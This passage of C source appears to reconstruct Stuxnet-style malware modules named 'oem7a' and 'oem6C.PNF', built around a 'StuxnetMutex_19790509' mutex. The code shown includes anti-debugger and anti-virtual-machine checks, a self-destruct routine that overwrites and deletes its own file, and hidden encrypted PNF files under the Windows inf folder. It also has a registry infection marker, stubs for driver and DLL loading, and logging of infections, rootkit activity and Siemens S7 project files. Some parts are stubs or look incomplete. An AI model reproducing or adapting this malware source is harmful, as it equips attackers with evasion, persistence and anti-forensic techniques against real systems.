        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL OEM7A_SelfDestruct(VOID) {
    WCHAR szPath[OEM7A_MAX_PATH];
    HANDLE hFile;
    BYTE buffer[4096];
    DWORD dwWritten;
    DWORD i;
    GetModuleFileNameW(NULL, szPath, OEM7A_MAX_PATH);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        ZeroMemory(buffer, 4096);
        for (i = 0; i < 10; i++) {
            SetFilePointer(hFile, i * 4096, NULL, FILE_BEGIN);
            WriteFile(hFile, buffer, 4096, &dwWritten, NULL);
        }
        CloseHandle(hFile);
    }
    DeleteFileW(szPath);
    DeleteFileW(g_Oem7aCtx.szPNFPath);
    return TRUE;
}

static BOOL OEM7A_Execute(VOID) {
    HANDLE hMutex;
    if (!OEM7A_Init()) return FALSE;
    if (OEM7A_IsExpired()) {
        OEM7A_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    if (OEM7A_CheckDebugger()) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    if (OEM7A_CheckVMware()) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    OEM7A_WriteRegistry();
    OEM7A_ReadRegistry();
    OEM7A_BuildPELoader();
    OEM7A_ExtractAndSavePNF();
    OEM7A_BuildDriverConfig();
    OEM7A_WriteDriverConfig();
    OEM7A_LoadMrxCls();
    OEM7A_LoadMainDLL();
    OEM7A_StartWorker();
    while (WaitForSingleObject(g_Oem7aCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM7A_IsExpired()) {
            break;
        }
        OEM7A_LoadMainDLL();
    }
    OEM7A_StopWorker();
    OEM7A_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            OEM7A_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OEM7A_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pEncrypted;
    PBYTE pDecrypted;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    if (!OEM7A_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    return OEM7A_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return OEM7A_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return OEM7A_BuildDriverConfig() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return OEM7A_WriteDriverConfig() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return OEM7A_LoadMrxCls() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return OEM7A_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return OEM7A_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return OEM7A_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    OEM7A_StopWorker();
    return 0;
}

DWORD WINAPI Export13(VOID) {
    OEM7A_SelfDestruct();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    return (DWORD)g_Oem7aCtx.dwPid;
}

DWORD WINAPI Export15(VOID) {
    return OEM7A_VERSION;
}

DWORD WINAPI Export16(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export17(VOID) {
    return g_dwInjectionCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwDecryptionCount;
}

DWORD WINAPI Export19(VOID) {
    return g_dwPELoadCount;
}

DWORD WINAPI Export20(VOID) {
    return (DWORD)g_Oem7aCtx.hMutex;
}
END

oem6c.PNF:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define OEM6C_MAGIC                     0x4F454D36
#define OEM6C_VERSION                   0x00010400
#define OEM6C_PNF_SIZE                  323848
#define OEM6C_MAX_PATH                  260
#define OEM6C_BUFFER_SIZE               4096
#define OEM6C_MAX_ENTRIES               4096

#define OEM6C_REG_KEY                   L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define OEM6C_REG_VALUE                 L"19790509"

#define OEM6C_ENTRY_TYPE_CONNECTION     0x2DA6
#define OEM6C_ENTRY_TYPE_S7P_MCP        0x246E
#define OEM6C_ENTRY_TYPE_NETWORK        0xF409
#define OEM6C_ENTRY_TYPE_INFECTION      0x7A2B
#define OEM6C_ENTRY_TYPE_ROOTKIT        0xF604

#define OEM6C_ENTRY_SUBTYPE_CONNECTION_1 0x0001
#define OEM6C_ENTRY_SUBTYPE_CONNECTION_2 0x0002
#define OEM6C_ENTRY_SUBTYPE_CONNECTION_3 0x0003

#define OEM6C_ENTRY_SUBTYPE_S7P_1       0x0001
#define OEM6C_ENTRY_SUBTYPE_S7P_2       0x0002
#define OEM6C_ENTRY_SUBTYPE_S7P_3       0x0003
#define OEM6C_ENTRY_SUBTYPE_S7P_4       0x0004
#define OEM6C_ENTRY_SUBTYPE_S7P_5       0x0005
#define OEM6C_ENTRY_SUBTYPE_S7P_6       0x0006

#define OEM6C_ENTRY_SUBTYPE_NETWORK_1   0x0001
#define OEM6C_ENTRY_SUBTYPE_NETWORK_2   0x0002
#define OEM6C_ENTRY_SUBTYPE_NETWORK_3   0x0003

#define OEM6C_ENTRY_SUBTYPE_INFECTION_2 0x0002
#define OEM6C_ENTRY_SUBTYPE_INFECTION_5 0x0005
#define OEM6C_ENTRY_SUBTYPE_INFECTION_6 0x0006
#define OEM6C_ENTRY_SUBTYPE_INFECTION_7 0x0007
#define OEM6C_ENTRY_SUBTYPE_INFECTION_8 0x0008

#define OEM6C_ENTRY_SUBTYPE_ROOTKIT_5   0x0005

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _OEM6C_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwEntryCount;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwReserved[8];
} OEM6C_HEADER, * POEM6C_HEADER;

typedef struct _OEM6C_LOG_ENTRY {
    WORD wType;
    WORD wSubType;
    DWORD dwTimestamp;
    DWORD dwDataLength;
    BYTE bData[512];
} OEM6C_LOG_ENTRY, * POEM6C_LOG_ENTRY;

typedef struct _OEM6C_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[OEM6C_MAX_PATH];
    WCHAR szSystemPath[OEM6C_MAX_PATH];
    WCHAR szWindowsPath[OEM6C_MAX_PATH];
    WCHAR szInfPath[OEM6C_MAX_PATH];
    WCHAR szPNFPath[OEM6C_MAX_PATH];
    BYTE bReserved[256];
} OEM6C_CTX, * POEM6C_CTX;

static OEM6C_CTX g_Oem6cCtx;
static BOOL g_bInitialized = FALSE;
static BYTE g_EncryptionKey[32] = {
    0x5C, 0x3B, 0x2D, 0x1A, 0x8E, 0xE1, 0x7C, 0x47,
    0x2A, 0x5D, 0x72, 0x09, 0xD4, 0x4F, 0x0B, 0x16,
    0x81, 0x2E, 0x6A, 0x3F, 0xB2, 0x4D, 0x08, 0x53,
    0x7F, 0x1C, 0x69, 0x06, 0x3E, 0x95, 0x2B, 0xD0
};

static OEM6C_LOG_ENTRY g_LogEntries[OEM6C_MAX_ENTRIES];
static DWORD g_dwEntryCount = 0;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwLogWriteCount = 0;
static DWORD g_dwLogReadCount = 0;

static BOOL OEM6C_InitNtImports(VOID);
static BOOL OEM6C_Init(VOID);
static VOID OEM6C_Cleanup(VOID);
static BOOL OEM6C_CheckMutex(VOID);
static BOOL OEM6C_IsExpired(VOID);
static BOOL OEM6C_CheckDebugger(VOID);
static BOOL OEM6C_CheckVMware(VOID);
static DWORD OEM6C_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID OEM6C_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize);
static VOID OEM6C_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox);
static VOID OEM6C_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ);
static VOID OEM6C_SimpleDecrypt(PBYTE pData, DWORD dwSize);
static VOID OEM6C_SimpleEncrypt(PBYTE pData, DWORD dwSize);
static BOOL OEM6C_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize);
static BOOL OEM6C_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL OEM6C_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL OEM6C_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL OEM6C_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL OEM6C_AddLogEntry(WORD wType, WORD wSubType, PBYTE pData, DWORD dwDataLength);
static BOOL OEM6C_WriteLogEntry(POEM6C_LOG_ENTRY pEntry);
static BOOL OEM6C_ReadLogEntry(DWORD dwIndex, POEM6C_LOG_ENTRY pEntry);
static BOOL OEM6C_SaveLogToDisk(VOID);
static BOOL OEM6C_LoadLogFromDisk(VOID);
static BOOL OEM6C_LogConnection(BOOL bSuccess);
static BOOL OEM6C_LogS7PProject(LPCWSTR szPath, DWORD dwType);
static BOOL OEM6C_LogNetwork(LPCWSTR szServerName);
static BOOL OEM6C_LogInfection(DWORD dwSubType);
static BOOL OEM6C_LogRootkit(VOID);
static BOOL OEM6C_ExtractAndSavePNF(VOID);
static BOOL OEM6C_WriteRegistry(VOID);
static BOOL OEM6C_ReadRegistry(VOID);
static DWORD WINAPI OEM6C_WorkerThread(LPVOID lpParam);
static BOOL OEM6C_StartWorker(VOID);
static BOOL OEM6C_StopWorker(VOID);
static BOOL OEM6C_SelfDestruct(VOID);
static BOOL OEM6C_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);
DWORD WINAPI Export21(VOID);
DWORD WINAPI Export22(VOID);
DWORD WINAPI Export23(VOID);
DWORD WINAPI Export24(VOID);
DWORD WINAPI Export25(VOID);
DWORD WINAPI Export26(VOID);
DWORD WINAPI Export27(VOID);
DWORD WINAPI Export28(VOID);
DWORD WINAPI Export29(VOID);
DWORD WINAPI Export30(VOID);

static BOOL OEM6C_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL OEM6C_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Oem6cCtx, sizeof(OEM6C_CTX));
    g_Oem6cCtx.dwMagic = OEM6C_MAGIC;
    g_Oem6cCtx.dwVersion = OEM6C_VERSION;
    g_Oem6cCtx.dwPid = GetCurrentProcessId();
    g_Oem6cCtx.dwTid = GetCurrentThreadId();
    g_Oem6cCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Oem6cCtx.csLock);
    GetModuleFileNameW(NULL, g_Oem6cCtx.szModulePath, OEM6C_MAX_PATH);
    GetSystemDirectoryW(g_Oem6cCtx.szSystemPath, OEM6C_MAX_PATH);
    GetWindowsDirectoryW(g_Oem6cCtx.szWindowsPath, OEM6C_MAX_PATH);
    wsprintfW(g_Oem6cCtx.szInfPath, L"%s\\inf", g_Oem6cCtx.szWindowsPath);
    wsprintfW(g_Oem6cCtx.szPNFPath, L"%s\\oem6C.PNF", g_Oem6cCtx.szInfPath);
    OEM6C_InitNtImports();
    ZeroMemory(g_LogEntries, sizeof(g_LogEntries));
    g_dwEntryCount = 0;
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID OEM6C_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_Oem6cCtx.hMutex) {
        CloseHandle(g_Oem6cCtx.hMutex);
        g_Oem6cCtx.hMutex = NULL;
    }
    if (g_Oem6cCtx.hThread) {
        CloseHandle(g_Oem6cCtx.hThread);
        g_Oem6cCtx.hThread = NULL;
    }
    if (g_Oem6cCtx.hStopEvent) {
        CloseHandle(g_Oem6cCtx.hStopEvent);
        g_Oem6cCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_Oem6cCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL OEM6C_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Oem6cCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL OEM6C_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL OEM6C_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM6C_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD OEM6C_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID OEM6C_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID OEM6C_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID OEM6C_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID OEM6C_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID OEM6C_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL OEM6C_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    POEM6C_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = 0x01AE0000;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM6C_HEADER)) {
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM6C_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(OEM6C_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(OEM6C_HEADER), dwDataSize);
    for (DWORD round = 0; round < 3; round++) {
        OEM6C_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        OEM6C_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM6C_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        OEM6C_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    return TRUE;
}

static BOOL OEM6C_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    POEM6C_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = 0x01AE0000;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(OEM6C_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    pHeader->dwMagic = OEM6C_MAGIC;
    pHeader->dwVersion = OEM6C_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwEntryCount = g_dwEntryCount;
    pHeader->dwChecksum = OEM6C_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(OEM6C_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < 3; round++) {
        OEM6C_SimpleEncrypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize);
        OEM6C_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM6C_RC4Crypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize, SBox, &i, &j);
        OEM6C_XORDecrypt(pEncrypted + sizeof(OEM6C_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    return TRUE;
}

static BOOL OEM6C_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    return TRUE;
}

static BOOL OEM6C_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL OEM6C_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL OEM6C_AddLogEntry(WORD wType, WORD wSubType, PBYTE pData, DWORD dwDataLength) {
    POEM6C_LOG_ENTRY pEntry;
    if (g_dwEntryCount >= OEM6C_MAX_ENTRIES) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    pEntry = &g_LogEntries[g_dwEntryCount];
    pEntry->wType = wType;
    pEntry->wSubType = wSubType;
    pEntry->dwTimestamp = GetTickCount();
    if (pData && dwDataLength > 0) {
        pEntry->dwDataLength = min(dwDataLength, 512);
        memcpy(pEntry->bData, pData, pEntry->dwDataLength);
    } else {
        pEntry->dwDataLength = 0;
        ZeroMemory(pEntry->bData, 512);
    }
    g_dwEntryCount++;
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    return TRUE;
}

static BOOL OEM6C_WriteLogEntry(POEM6C_LOG_ENTRY pEntry) {
    if (!pEntry) return FALSE;
    return OEM6C_AddLogEntry(pEntry->wType, pEntry->wSubType, pEntry->bData, pEntry->dwDataLength);
}

static BOOL OEM6C_ReadLogEntry(DWORD dwIndex, POEM6C_LOG_ENTRY pEntry) {
    if (!pEntry || dwIndex >= g_dwEntryCount) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    memcpy(pEntry, &g_LogEntries[dwIndex], sizeof(OEM6C_LOG_ENTRY));
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    return TRUE;
}

static BOOL OEM6C_SaveLogToDisk(VOID) {
    PBYTE pData;
    DWORD dwDataSize;
    DWORD dwEncryptedSize;
    PBYTE pEncrypted;
    BOOL bResult;
    if (g_dwEntryCount == 0) {
        return TRUE;
    }
    dwDataSize = g_dwEntryCount * sizeof(OEM6C_LOG_ENTRY);
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize);
    if (!pData) {
        return FALSE;
    }
    EnterCriticalSection(&g_Oem6cCtx.csLock);
    memcpy(pData, g_LogEntries, dwDataSize);
    LeaveCriticalSection(&g_Oem6cCtx.csLock);
    dwEncryptedSize = dwDataSize + sizeof(OEM6C_HEADER) + 4096;
    pEncrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEncryptedSize);
    if (!pEncrypted) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    bResult = OEM6C_EncryptPNF(pData, dwDataSize, pEncrypted, &dwEncryptedSize);
    if (bResult) {
        bResult = OEM6C_WritePNFToDisk(g_Oem6cCtx.szPNFPath, pEncrypted, dwEncryptedSize);
        if (bResult) {
            g_dwLogWriteCount++;
        }
    }
    HeapFree(GetProcessHeap(), 0, pData);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    return bResult;
}

static BOOL OEM6C_LoadLogFromDisk(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PBYTE pDecrypted;
    DWORD dwDecryptedSize;
    POEM6C_HEADER pHeader;
    BOOL bResult;
    if (!OEM6C_ReadPNFFromDisk(g_Oem6cCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM6C_HEADER)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    pHeader = (POEM6C_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM6C_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    bResult = OEM6C_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize);
    if (bResult) {
        EnterCriticalSection(&g_Oem6cCtx.csLock);
        g_dwEntryCount = dwDecryptedSize / sizeof(OEM6C_LOG_ENTRY);
        if (g_dwEntryCount > OEM6C_MAX_ENTRIES) {
            g_dwEntryCount = OEM6C_MAX_ENTRIES;
        }
        memcpy(g_LogEntries, pDecrypted, g_dwEntryCount * sizeof(OEM6C_LOG_ENTRY));
        LeaveCriticalSection(&g_Oem6cCtx.csLock);
        g_dwLogReadCount++;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return bResult;
}

static BOOL OEM6C_LogConnection(BOOL bSuccess) {
    WORD wSubType;
    if (bSuccess) {
        wSubType = OEM6C_ENTRY_SUBTYPE_CONNECTION_2;
    } else {
        wSubType = OEM6C_ENTRY_SUBTYPE_CONNECTION_1;
    }
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_CONNECTION, wSubType, NULL, 0);
}

